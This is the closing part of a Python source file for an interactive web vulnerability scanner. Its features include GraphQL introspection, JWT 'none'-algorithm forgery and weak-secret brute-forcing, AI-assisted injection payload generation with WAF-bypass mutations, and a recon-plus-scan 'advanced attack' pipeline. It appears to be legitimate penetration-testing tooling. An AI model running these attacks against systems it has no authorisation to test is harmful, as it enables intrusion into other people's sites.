                                  severity.value, cs, cv, remediation=REMEDIATION_DB.get('api', ''))
                api_vulns.append(v)
                print(Fore.RED + f"    - {issue} [{severity.value}]")

        self.results.extend(api_vulns)
        if api_vulns:
            ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            save_enhanced_report(api_vulns, filename=f"api_scan_{ts}")

    def graphql_scan(self):
        url = input(f"{Fore.CYAN}GraphQL URL: {Style.RESET_ALL}").strip()
        domain, full_url = normalize_url(url)
        if not self.scope.allowed:
            self.scope.allowed.add(domain.split(':')[0])

        scanner = EnhancedWebVulnScanner(full_url, self.ai_engine, scope=self.scope)
        gql = scanner.graphql_scanner

        ep = gql.detect_graphql()
        if not ep:
            print(Fore.RED + "[-] No GraphQL endpoint detected.")
            return
        print(Fore.GREEN + f"[+] GraphQL endpoint: {ep}")

        if gql.test_introspection_disabled(ep):
            print(Fore.GREEN + "[+] Introspection disabled (secure)")
        else:
            print(Fore.RED + "[!] Introspection ENABLED — schema exposed")
            schema = gql.introspect_schema(ep)
            if schema:
                sf = f"graphql_schema_{datetime.datetime.now():%Y%m%d_%H%M%S}.json"
                with open(sf, 'w') as f:
                    json.dump(schema, f, indent=2)
                print(Fore.YELLOW + f"[+] Schema saved: {sf}")

        if gql.test_depth_limit(ep):
            print(Fore.RED + "[!] No query depth limit — DoS risk")

        hidden = gql.find_hidden_fields(ep)
        if hidden:
            print(Fore.YELLOW + f"[!] Hidden fields found: {', '.join(hidden)}")

    def jwt_scan(self):
        token = input(f"{Fore.CYAN}JWT token: {Style.RESET_ALL}").strip()
        context = input(f"{Fore.CYAN}Context URL (optional): {Style.RESET_ALL}").strip()

        jscanner = JWTScanner()
        header, payload = jscanner.decode_jwt(token)

        if header and payload:
            print(f"\n{Fore.GREEN}[+] Decoded JWT:")
            print(f"{Fore.CYAN}Header : {json.dumps(header, indent=2)}")
            print(f"{Fore.CYAN}Payload: {json.dumps(payload, indent=2)}")

            issues = jscanner.analyze_token(token)
            if issues:
                print(f"\n{Fore.YELLOW}[!] Issues Found:")
                for issue, sev in issues:
                    color = Fore.RED if sev in (Severity.CRITICAL, Severity.HIGH) else Fore.YELLOW
                    print(color + f"  [{sev.value}] {issue}")

            none_tok = jscanner.test_none_algorithm(token)
            if none_tok:
                print(Fore.RED + f"\n[!] 'none' algorithm bypass token:\n{none_tok}")

            # Brute-force secret
            print(Fore.CYAN + "[*] Testing common weak secrets...")
            secret = jscanner.brute_secret(token)
            if secret:
                print(Fore.RED + f"[!] Weak secret found: '{secret}'")
            else:
                print(Fore.GREEN + "[+] No common weak secret matched")
        else:
            print(Fore.RED + "[-] Invalid JWT format")

    def payload_generator(self):
        print(f"{Fore.CYAN}Payload Generator\n{'-'*40}")
        fn   = input("Field name (e.g. 'search'): ").strip()
        ft   = input("Field type (text/password/hidden/url/file): ").strip() or 'text'
        waf  = input("WAF detected? (cloudflare/modsecurity/none): ").strip().lower()
        bypasses = WAFDetector().get_bypass_mutations(waf.title()) if waf != 'none' else []

        attack_type = self._attack_type_menu()
        custom = self._custom_payloads()

        # Ask for AI (optional)
        use_ai = input(f"{Fore.CYAN}Use AI for payload generation? (y/n): {Style.RESET_ALL}").strip().lower()
        if use_ai == 'y':
            ai_engine = self._ask_ai()
        else:
            ai_engine = EnhancedLocalAIEngine(None)

        payloads = ai_engine.generate_payloads_for_field(
            fn, ft, attack_type, custom, waf_bypasses=bypasses
        )

        if payloads:
            print(f"\n{Fore.GREEN}[+] Generated {len(payloads)} payloads:")
            for i, p in enumerate(payloads, 1):
                print(f"{Fore.WHITE}{i:3}. {Fore.YELLOW}{p}")
            save = input(f"\n{Fore.CYAN}Save to file? (y/n): ").strip().lower()
            if save == 'y':
                fn_out = input("Filename: ").strip() or f"payloads_{random_string(6)}.txt"
                with open(fn_out, 'w') as f:
                    f.write('\n'.join(payloads))
                print(Fore.GREEN + f"[+] Saved: {fn_out}")
        else:
            print(Fore.RED + "[-] No payloads generated")

    def advanced_attack(self):
        url = input(f"{Fore.CYAN}Target domain (e.g. example.com): {Style.RESET_ALL}").strip()
        domain, full_url = normalize_url(url)

        if not self.scope.allowed:
            self.scope.allowed.add(domain.split(':')[0])

        depth = self._depth()
        custom = self._custom_payloads()

        # Ask for AI
        use_ai = input(f"{Fore.CYAN}Use AI (current: {'enabled' if self.ai_engine.ai_engine else 'disabled'})? (y/n): {Style.RESET_ALL}").strip().lower()
        if use_ai == 'y':
            ai_engine = self._ask_ai()
        else:
            ai_engine = EnhancedLocalAIEngine(None)

        print(Fore.YELLOW + "=" * 60 + "\nPhase 1: Reconnaissance\n" + "=" * 60)
        recon = EnhancedReconScanner(domain, self.scope)
        recon_results = recon.run_all(deep=(depth == 3))
        self.recon_results = recon_results

        # Collect live targets
        live = [full_url]
        if recon_results.get('subdomains'):
            print(Fore.CYAN + f"\n[*] Probing {min(20, len(recon_results['subdomains']))} subdomains...")
            for sub in recon_results['subdomains'][:20]:
                for proto in ('https', 'http'):
                    test_url = f"{proto}://{sub}"
                    if not self.scope.is_in_scope(test_url):
                        continue
                    try:
                        r = requests.get(test_url, timeout=3, verify=False)
                        if r.status_code < 500:
                            live.append(test_url)
                            print(Fore.GREEN + f"  [+] Live: {test_url}")
                            break
                    except requests.RequestException:
                        pass

        print(Fore.YELLOW + f"\n{'='*60}\nPhase 2: Vulnerability Scanning ({len(live)} targets)\n{'='*60}")
        all_vulns: List[Vulnerability] = []
        threads = {1: 5, 2: 10, 3: 20}.get(depth, 10)

        for target in live:
            print(Fore.CYAN + f"\n[*] Scanning {target}")
            scanner = EnhancedWebVulnScanner(
                target, ai_engine, threads=threads,
                config=self.config_manager.config, scope=self.scope
            )
            results = scanner.scan(custom_payloads=custom)
            if results:
                all_vulns.extend(results)
                print(Fore.RED + f"[!] {len(results)} vulns on {target}")

        self.results.extend(all_vulns)

        print(Fore.YELLOW + f"\n{'='*60}\nPhase 3: Report Generation\n{'='*60}")
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        save_enhanced_report(all_vulns, recon_results, filename=f"advanced_attack_{ts}",
                             formats=['txt', 'html', 'json', 'sarif', 'pdf'])

    def load_previous_results(self):
        files = [f for f in os.listdir('.')
                 if f.startswith(('web_scan_', 'recon_', 'advanced_', 'api_scan_', 'hsr_report_'))
                 and f.endswith('.json')]
        if not files:
            print(Fore.YELLOW + "[-] No saved result files found.")
            return
        for i, fn in enumerate(files, 1):
            print(f"  {Fore.GREEN}{i:3}.{Fore.WHITE} {fn}")
        c = input(f"{Fore.CYAN}Select (0 to cancel): {Style.RESET_ALL}").strip()
        if not c.isdigit() or not (1 <= int(c) <= len(files)):
            return
        fn = files[int(c) - 1]
        try:
            with open(fn, 'r') as f:
                data = json.load(f)
            print(Fore.GREEN + f"[+] Loaded {fn}")
            summary = data.get('summary', {})
            print(f"  Total: {summary.get('total', 0)}")
            for sev, cnt in summary.get('by_severity', {}).items():
                print(f"  {sev}: {cnt}")
            add = input(f"{Fore.CYAN}Add to session? (y/n): ").strip().lower()
            if add == 'y':
                for vd in data.get('vulnerabilities', []):
                    self.results.append(Vulnerability(
                        vuln_type=vd.get('type', ''), parameter=vd.get('parameter', ''),
                        payload=vd.get('payload', ''), evidence=vd.get('evidence', ''),
                        url=vd.get('url', ''), severity=vd.get('severity', 'Medium'),
                        cvss_score=vd.get('cvss_score', 0.0),
                        remediation=vd.get('remediation', '')
                    ))
                print(Fore.GREEN + f"[+] Added {len(data.get('vulnerabilities', []))} findings to session")
        except (OSError, json.JSONDecodeError) as e:
            print(Fore.RED + f"[-] Error: {e}")

    def generate_report(self):
        if not self.results and not self.recon_results:
            print(Fore.YELLOW + "[-] No results to report.")
            return
        fmt_input = input("Formats (txt,html,pdf,json,sarif) [html,json,sarif]: ").strip()
        formats = [f.strip().lower() for f in fmt_input.split(',')] if fmt_input else ['html', 'json', 'sarif']
        fn = input("Filename (no extension) [hsr_report]: ").strip()
        if not fn:
            fn = f"hsr_report_{datetime.datetime.now():%Y%m%d_%H%M%S}"
        save_enhanced_report(self.results, self.recon_results, fn, formats)

    def manage_scope(self):
        print(f"\n{Fore.CYAN}Current scope: {', '.join(self.scope.allowed) or 'None (permissive)'}")
        print("  1. Add domain to scope")
        print("  2. Remove domain from scope")
        print("  3. Clear scope (permissive mode)")
        c = input("Choice: ").strip()
        if c == '1':
            d = input("Domain to add: ").strip()
            self.scope.allowed.add(d.lower())
            print(Fore.GREEN + f"[+] Added {d}")
        elif c == '2':
            d = input("Domain to remove: ").strip()
            self.scope.allowed.discard(d.lower())
            print(Fore.GREEN + f"[+] Removed {d}")
        elif c == '3':
            self.scope.allowed.clear()
            print(Fore.YELLOW + "[!] Scope cleared — all domains allowed")

    def run(self):
        print_banner()
        missing = check_external_tools()
        if missing:
            print(Fore.YELLOW + "[!] Install missing tools for full functionality:")
            print(Fore.WHITE + "    sudo apt install nmap dnsutils whatweb")
            print(Fore.WHITE + "    go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
            print(Fore.WHITE + "    go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
            print(Fore.WHITE + "    go install github.com/projectdiscovery/katana/cmd/katana@latest")
            print()

        dispatch = {
            '1': self.web_vuln_scan, '2': self.recon_scan,
            '3': self.api_scan,      '4': self.graphql_scan,
            '5': self.jwt_scan,      '6': self.payload_generator,
            '7': self.advanced_attack,'8': self.load_previous_results,
            '9': self.generate_report,'10': self.manage_scope,
        }

        while True:
            try:
                choice = self._menu()
                if choice == '0':
                    print(Fore.GREEN + "Goodbye!")
                    break
                if choice in dispatch:
                    dispatch[choice]()
                else:
                    print(Fore.RED + "Invalid option.")
                input(f"\n{Fore.CYAN}Press Enter to continue...")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}Interrupted.")
                break
            except Exception as e:
                logger.error(f"Unexpected error: {e}", exc_info=True)
                print(Fore.RED + f"Error: {e}")


# ====================== CLI Entry Point ======================

def cli_args():
    parser = argparse.ArgumentParser(description=f'HSR Advanced v{TOOL_VERSION} — Web Security Scanner')
    parser.add_argument('--url',       help='Target URL (non-interactive scan)')
    parser.add_argument('--type',      choices=['xss','sql','cmd','lfi','ssti','ssrf','xxe','nosql'],
                        help='Attack type', default=None)
    parser.add_argument('--depth',     choices=['1','2','3'], default='2', help='Scan depth')
    parser.add_argument('--threads',   type=int, default=10, help='Number of threads')
    parser.add_argument('--payloads',  help='Custom payload file')
    parser.add_argument('--output',    help='Output filename prefix')
    parser.add_argument('--formats',   default='html,json,sarif', help='Report formats (comma-sep)')
    parser.add_argument('--scope',     help='Allowed domain(s), comma-separated')
    parser.add_argument('--recon',     action='store_true', help='Run recon before scan')
    # AI options
    parser.add_argument('--ai-provider', choices=['ollama', 'openai'], default='ollama', help='AI provider (default: ollama)')
    parser.add_argument('--ai-model', help='AI model name (e.g., gpt-3.5-turbo, phi)')
    parser.add_argument('--api-key', help='API key for cloud AI provider (if applicable)')
    parser.add_argument('--interactive', action='store_true', default=True, help='Interactive mode')
    return parser.parse_args()


if __name__ == '__main__':
    args = cli_args()

    if args.url:
        # Non-interactive CLI mode
        print_banner()
        domain, full_url = normalize_url(args.url)
        scope_domains = [d.strip() for d in args.scope.split(',')] if args.scope else [domain]
        scope = ScopeManager(scope_domains)

        # Setup AI
        if args.ai_provider == 'ollama':
            ai_engine = OllamaEngine(model=args.ai_model or 'phi')
        elif args.ai_provider == 'openai':
            api_key = args.api_key or os.environ.get('HSR_AI_API_KEY')
            if not api_key:
                print(Fore.YELLOW + "[!] No API key provided for OpenAI. Disabling AI.")
                ai_engine = None
            else:
                ai_engine = RemoteAIEngine(provider='openai', model=args.ai_model or 'gpt-3.5-turbo', api_key=api_key)
        else:
            ai_engine = None

        enhanced_ai = EnhancedLocalAIEngine(ai_engine)

        custom = load_payloads_from_file(args.payloads) if args.payloads else []
        formats = [f.strip() for f in args.formats.split(',')]
        output = args.output or f"cli_scan_{datetime.datetime.now():%Y%m%d_%H%M%S}"

        recon_data: Dict = {}
        if args.recon:
            recon_scanner = EnhancedReconScanner(domain, scope)
            recon_data = recon_scanner.run_all(deep=(args.depth == '3'))

        scanner = EnhancedWebVulnScanner(
            full_url, enhanced_ai, threads=args.threads,
            config=ConfigManager().config, scope=scope
        )
        results = scanner.scan(attack_type=args.type, custom_payloads=custom)
        save_enhanced_report(results, recon_data, output, formats)
        print(Fore.GREEN + f"\n[+] Done. Found {len(results)} vulnerabilities.")
        sys.exit(0 if not results else 1)
    else:
        tool = HSRAdvancedTool()
        tool.run()
